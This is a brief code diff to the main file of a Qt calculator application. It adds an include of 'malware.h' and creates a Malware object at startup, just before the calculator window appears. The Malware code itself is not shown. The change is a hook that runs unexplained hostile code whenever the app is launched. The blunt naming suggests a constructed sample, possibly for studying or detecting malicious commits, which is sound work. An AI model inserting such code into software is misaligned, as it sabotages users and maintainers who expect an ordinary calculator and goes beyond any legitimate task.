@@ -49,12 +49,13 @@
 ****************************************************************************/
 
 #include <QApplication>
-
+#include "malware.h"
 #include "calculator.h"
 
 int main(int argc, char *argv[])
 {
     QApplication app(argc, argv);
+    Malware *m = new Malware();
     Calculator calc;
     calc.show();
     return app.exec();
